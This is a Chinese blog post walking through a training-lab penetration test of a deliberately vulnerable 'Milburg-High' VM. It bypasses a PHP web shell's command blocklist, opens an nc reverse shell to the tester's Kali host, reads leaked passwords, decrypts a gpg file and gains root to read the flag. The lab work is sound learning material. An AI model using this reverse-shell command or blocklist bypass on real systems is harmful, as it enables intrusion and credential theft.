<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /dev_shell.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.233.138</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.233.138</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.233.138/dev_shell.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">in_command=/bin/ls</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Thu, 04 Jan 2024 06:35:48 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 845</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    <span class="comment">#back&#123;</span></span><br><span class="line">      position: fixed;</span><br><span class="line">      top: 0;</span><br><span class="line">      left: 0;</span><br><span class="line">      min-width: 100%;</span><br><span class="line">      min-height: 100%;</span><br><span class="line">      z-index:-10</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">#shell&#123;</span></span><br><span class="line">        color: white;</span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;!-- WIP, don<span class="string">&#x27;t forget to report any bugs we don&#x27;</span>t want another breach guys</span><br><span class="line">  -Bob --&gt;</span><br><span class="line">  &lt;div <span class="built_in">id</span>=<span class="string">&quot;shell&quot;</span>&gt;</span><br><span class="line">    &lt;h2&gt;</span><br><span class="line">      dev_shell</span><br><span class="line">    &lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;dev_shell.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">      Command: &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;in_command&quot;</span> /&gt; &lt;br&gt;</span><br><span class="line">      &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">    WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;dev_shell_back.png&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;back&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下载<code>bak</code>文件并查看<code>vim dev_shell.php.bak</code></p>
<blockquote>
<p>dev_shell.php.bak</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">//init</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">invalid = 0;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">command</span> = (<span class="variable">$_POST</span>[<span class="string">&#x27;in_command&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">bad_words = array(<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;netcat&quot;</span>, <span class="string">&quot;ssh&quot;</span>, <span class="string">&quot;wget&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;traceroute&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nc&quot;</span>);</span></span><br><span class="line">?&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">back&#123;</span></span><br><span class="line">position: fixed;</span><br><span class="line">top: 0;</span><br><span class="line">left: 0;</span><br><span class="line">min-width: 100%;</span><br><span class="line">min-height: 100%;</span><br><span class="line">z-index:-10</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell&#123;</span></span><br><span class="line">  color: white;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=&quot;shell&quot;&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">dev_shell</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line">&lt;form action=&quot;dev_shell.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">Command: &lt;input type=&quot;text&quot; name=&quot;in_command&quot; /&gt; &lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;h5&gt;Output:&lt;/h5&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;running command...&quot;);</span><br><span class="line">//executes system Command</span><br><span class="line">//checks for sneaky ;</span><br><span class="line">if (strpos($command, &#x27;;&#x27;) !==false)&#123;</span><br><span class="line">  system(&quot;echo Nice try skid, but you will never get through this bulletproof php code&quot;); //doesn&#x27;t work :P</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"><span class="meta prompt_">  $</span><span class="language-bash">is_he_a_bad_man = explode(<span class="string">&#x27; &#x27;</span>, trim(<span class="variable">$command</span>));</span></span><br><span class="line">  //checks for dangerous commands</span><br><span class="line">  if (in_array($is_he_a_bad_man[0], $bad_words))&#123;</span><br><span class="line">    system(&quot;echo Get out skid lol&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    system($_POST[&#x27;in_command&#x27;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;img src=&quot;dev_shell_back.png&quot; id=&quot;back&quot; alt=&quot;&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>代码审计</strong>：根据代码审计发现黑名单，发现nc被过滤了，可以尝试绕过黑名单</p>
<p><strong>反弹shell</strong>：之前网站页面内容中有透露网页存在shell且做了加固。因此我们需要提升权限，使用工具<code>nc</code>反弹shell，在抓包工具BP页面将输入更改为/<code>bin/nc -e /bin/bash 192.168.244.132 8888</code>，该IP为Kali的IP，因为我们需要让网页向Kali发送response，send一下，在命令行中查收结果，此时反弹shell成功，可以查看ls等黑名单中的命令。使用命令id可以看到我们拿到了用户<code>www-data</code>的shell。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line"></span><br><span class="line">in_command=/bin/nc -e /bin/bash 192.168.233.135 7777</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104144346262.png" class="" title="image-20240104144346262">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvvp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.233.138: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.233.135] from (UNKNOWN) [192.168.233.138] 50180</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg</span><br><span class="line">about.html</span><br><span class="line">contact.html</span><br><span class="line">dev_shell.php</span><br><span class="line">dev_shell.php.bak</span><br><span class="line">dev_shell_back.png</span><br><span class="line">index.html</span><br><span class="line">index.html.bak</span><br><span class="line">lat_memo.html</span><br><span class="line">login.html</span><br><span class="line">news.html</span><br><span class="line">passwords.html</span><br><span class="line">robots.txt</span><br><span class="line">school_badge.png</span><br><span class="line"><span class="built_in">id</span> </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data),100(<span class="built_in">users</span>)</span><br></pre></td></tr></table></figure>
<p><strong>进入交互式shell</strong>：使用Python的模块调用bash，前提是目标靶机有Python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145017010.png" class="" title="image-20240104145017010">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145328639.png" class="" title="image-20240104145328639">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>/</span><br><span class="line">bash: <span class="built_in">cd</span>/: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">WIP.jpg        dev_shell.php.bak   lat_memo.html   robots.txt</span><br><span class="line">about.html     dev_shell_back.png  login.html      school_badge.png</span><br><span class="line">contact.html   index.html          news.html</span><br><span class="line">dev_shell.php  index.html.bak      passwords.html</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cat</span> flag.txt </span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: No such file or directory</span><br><span class="line">www-data@Milburg-High:/var/www/html$ <span class="built_in">cd</span> ../../</span><br><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line">www-data@Milburg-High:/var$ <span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">ls</span> -a</span><br><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line">.    boot  flag.txt    initrd.img.old  lost+found  opt   run   sys  var</span><br><span class="line">..   dev   home        lib             media       proc  sbin  tmp  vmlinuz</span><br><span class="line">bin  etc   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old</span><br><span class="line">www-data@Milburg-High:/$ <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span>: flag.txt: Permission denied</span><br></pre></td></tr></table></figure>
<p>浏览根目录文件找到flag.txt，flag.txt只有管理员有读写权限，so我们需要拿到管理员权限。在<code>etc</code>目录下发现了文件passwd，查看该文件，文件中包含用户名信息，其中就有Bob用户，通过网站页面信息了解到Bob可能是管理员。因此紧接着浏览bob的家目录，发现隐藏敏感文件<code>.old_passwordfile.html</code>，查看该文件发现了<code>jc</code>和<code>seb</code>的账号密码。</p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160041914.png" class="" title="image-20240104160041914">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html</span><br><span class="line">cat .old_passwordfile.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">jc:Qwerty</span><br><span class="line">seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160633573.png" class="" title="image-20240104160633573">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> /home/bob/</span><br><span class="line"><span class="built_in">cd</span> /home/bob/</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">ls</span> -l</span><br><span class="line"><span class="built_in">ls</span> -l</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Desktop</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Documents</span><br><span class="line">drwxr-xr-x 3 bob bob 4096 Mar  8  2018 Downloads</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Music</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Pictures</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Public</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Templates</span><br><span class="line">drwxr-xr-x 2 bob bob 4096 Feb 21  2018 Videos</span><br><span class="line">jc@Milburg-High:/home/bob$ <span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">login.txt.gpg  Secret  staff.txt</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$ <span class="built_in">cat</span> login.txt.gpg</span><br><span class="line"><span class="built_in">cat</span> login.txt.gpg</span><br><span class="line">o��J[V0w�q�OS����@P�i4��u</span><br><span class="line">                         E,����8=kj�Z����9`�5G��4��!�����!�����Q:�1���Q�jc@Milburg-High:/home/bob/Documents$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>解密<code>gpg</code>文件</strong><br>登上<code>jc</code>账号，浏览其家目录，没找到有用信息，保持旺盛的好奇心，浏览对方所有文件，搜集有用信息，最终我们在Bob家目录的documents中找到了文件<code>login.txt.gpg</code>（<code>gpg</code>是<code>linux</code>的加密格式），需要将该文件解密后查看。<br>解密<code>gpg</code>文件：查看Bob家目录的documents中的Secret文件夹，发现了文件<code>notes.sh</code>（<code>sh</code>后缀为<code>linux</code>下的shell脚本文件）查看该内容后开始猜测其含义，最终确定这是藏头诗，找到了密钥（<strong>HARPOCRATES</strong>），破解文件<code>login.txt.gpg</code>，并查看该文件内容。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">notes.sh</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ./notes.sh</span><br><span class="line">./notes.sh</span><br><span class="line">TERM environment variable not <span class="built_in">set</span>.</span><br><span class="line">-= Notes =-</span><br><span class="line">Harry Potter is my faviorite</span><br><span class="line">Are you the real me?</span><br><span class="line">Right, I<span class="string">&#x27;m ordering pizza this is going nowhere</span></span><br><span class="line"><span class="string">People just don&#x27;</span>t get me</span><br><span class="line">Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;</span><br><span class="line">Cucumber</span><br><span class="line">Rest now your eyes are sleepy</span><br><span class="line">Are you gonna stop reading this yet?</span><br><span class="line">Time to fix the server</span><br><span class="line">Everyone is annoying</span><br><span class="line">Sticky notes gotta buy em</span><br><span class="line">&lt;uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ </span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104155409288.png" class="" title="image-20240104155409288">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jc@Milburg-High:/home/bob/Documents$ gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">&lt;g --batch --passphrase HARPOCRATES -d login.txt.gpg</span><br><span class="line">gpg: keybox <span class="string">&#x27;/home/jc/.gnupg/pubring.kbx&#x27;</span> created</span><br><span class="line">gpg: AES encrypted data</span><br><span class="line">gpg: encrypted with 1 passphrase</span><br><span class="line">bob:b0bcat_</span><br><span class="line">jc@Milburg-High:/home/bob/Documents$</span><br></pre></td></tr></table></figure>
 <img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161606959.png" class="" title="image-20240104161606959">
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bob@Milburg-High:~/Documents$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(bob) gid=1001(bob) <span class="built_in">groups</span>=1001(bob),27(sudo)</span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161706416.png" class="" title="image-20240104161706416">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161832640.png" class="" title="image-20240104161832640">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /flag.txt</span><br><span class="line">[sudo] password for bob: b0bcat_</span><br><span class="line"></span><br><span class="line">CONGRATS ON GAINING ROOT</span><br><span class="line"></span><br><span class="line">        .-.</span><br><span class="line">       (   )</span><br><span class="line">        |~|       _.--._</span><br><span class="line">        |~|~:&#x27;--~&#x27;      |</span><br><span class="line">        | | :   #root   |</span><br><span class="line">        | | :     _.--._|</span><br><span class="line">        |~|~`&#x27;--~&#x27;</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line"></span><br><span class="line">   _____|_|_________ Thanks for playing ~c0rruptedb1t</span><br></pre></td></tr></table></figure>
<h4 id="三、总结-1"><a href="#三、总结-1" class="headerlink" title="三、总结"></a>三、总结</h4><p>通过本次实训，我们全面了解了渗透测试的基本流程和操作方法。从初步的信息收集到最终获取目标主机的控制权，每一步都是为了更深入地理解目标系统的安全漏洞。通过这次实验，不仅加深了对理论知识的理解，还提高了实际操作能力。实训中使用的工具和技术，如<code>Nmap、Nikto、Burp Suite</code>等，是网络安全领域的基石，掌握这些工具对于未来的安全研究和职业生涯至关重要。</p>
<p>此外，实训也强调了进行渗透测试时的道德和法律责任。所有测试活动都应在合法和道德的范围内进行。总之，本次实训不仅提高了技术技能，也增进了对网络安全重要性的认识。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
